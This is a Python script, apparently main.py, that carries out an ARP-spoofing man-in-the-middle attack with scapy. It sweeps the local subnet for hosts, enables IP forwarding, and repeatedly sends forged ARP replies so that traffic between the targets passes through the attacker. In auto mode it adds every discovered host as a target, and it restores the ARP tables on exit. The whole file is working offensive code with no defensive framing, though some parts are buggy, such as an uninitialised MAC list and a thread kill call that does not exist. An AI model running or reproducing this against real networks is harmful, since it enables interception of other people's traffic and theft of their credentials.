import os
import sys
import time
from scapy.all import *
import socket
from threading import Thread

class Netscanner:
    def __init__(self, interface):
        self.interface = interface
        self.IPAddr = socket.gethostbyname(socket.gethostname())
        print("[*] excluding host IP: " + self.IPAddr)
        # get subnet mask using ip a on linux
        self.subnet = os.popen("ip a | grep " + self.interface + " | grep inet | awk '{print $2}'").read().split("/")[1][:-1]
        # get network address using subnet and host ip
        self.scanip = self.IPAddr[:self.IPAddr.rfind(".")] + ".1/" + self.subnet
        self.ips = []

    def sniffer_arp(self):
        # IP Address for the destination
        # create ARP packet
        arp = ARP(pdst=self.scanip)
        # create the Ether broadcast packet
        # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        # stack them
        packet = ether / arp

        result = srp(packet, timeout=3, verbose=0)[0]

        # a list of clients, we will fill this in the upcoming loop
        clients = []

        for sent, received in result:
            # for each response, append ip and mac address to `clients` list
            ip = received.psrc
            if ip != self.IPAddr:
                self.ips.append(received.psrc)



    def get_ips(self):
        print("[*] Scanning Network...")
        self.sniffer_arp()
        return self.ips


class MITMAttack:

    def __init__(self, interface, target_ips):
        self.interface = interface
        self.target_ips = target_ips
        self.scannerT = None

    def scanner(self):
        scanner = Netscanner(self.interface)
        while True:
            ips = scanner.get_ips()
            for ip in ips:
                if ip not in self.target_ips:
                    self.target_ips.append(ip)
                    self.targetMACs.append(self.get_mac(ip))
            print(f"[*] Target IPs: {self.target_ips}")
            time.sleep(5)

    def enable_ip_forwarding(self):
        print("\n[*] Enabling IP Forwarding...\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def get_mac(self, IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=self.interface, inter=0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    def reARP(self):
        print("\n[*] Restoring Targets...")
        # we have to restaure each victim to its original state the same way we tricked them
        for i, ip in enumerate(self.target_ips):
            for j, ip2 in enumerate(self.target_ips):
                if i != j:
                    send(ARP(op=2, pdst=ip, psrc=ip2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.targetMACs[i]), count=7)
        print("\n[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        if self.scannerT is not None:
            print("[*] Stopping sniffer thread...")
            self.scannerT.kill()

        print("[*] Shutting Down...")
        sys.exit(1)

    def trick(self):
        if len(self.target_ips) != 0:
            for i, ip in enumerate(self.target_ips):
                print(f"[*] Poisoning {ip} - {self.targetMACs[i]}")
                for j, ip2 in enumerate(self.target_ips):
                    if i != j:
                        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=self.targetMACs[i]))

    def mitm(self,mode):
        try:
            self.targetMACs = [self.get_mac(ip) for ip in self.target_ips]
        except Exception:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[!] Couldn't Find MAC Address(es)")
            print("[!] Exiting...")
            sys.exit(1)
        if mode == "auto":
            print("[*] Starting scanner thread...")
            self.scannerT = Thread(target=self.scanner)
            self.scannerT.start()


        print("[*] Poisoning Targets...")
        print("[*] Use CTRL+C to stop")
        print("[*] Targets poisoned: ")
        for i, ip in enumerate(self.target_ips):
            print(f"[*]  {ip} - {self.targetMACs[i]}")
        while True:
            try:
                self.trick()
                time.sleep(1.5)
            except KeyboardInterrupt:
                self.reARP()
                break

def print_usage():
    print('Usage: python main.py -i <interface> -t "<target_ip1> <target_ip2> ..."')
def main(argv):

    interface = None
    target_ips = []
    for i in range(len(argv)):
        if argv[i] == "-i":
            interface = argv[i + 1]
        elif argv[i] == "-t":
            target_ips = argv[i + 1].split(" ")
    mode = "manual"
    if interface is None:
        print("Interface not specified")
        print_usage()
        sys.exit(1)
    elif len(target_ips) == 0:
        print("Target IPs not specified using auto mode")
        print_usage()
        mode = "auto"


    print(f"Interface: {interface}")
    print(f"Target IPs: {target_ips}")
    attack = MITMAttack(interface, target_ips)
    attack.enable_ip_forwarding()
    attack.mitm(mode)



if __name__ == "__main__":
    #attack = MITMAttack()
    #attack.enable_ip_forwarding()
    #attack.mitm()
    main(sys.argv[1:])
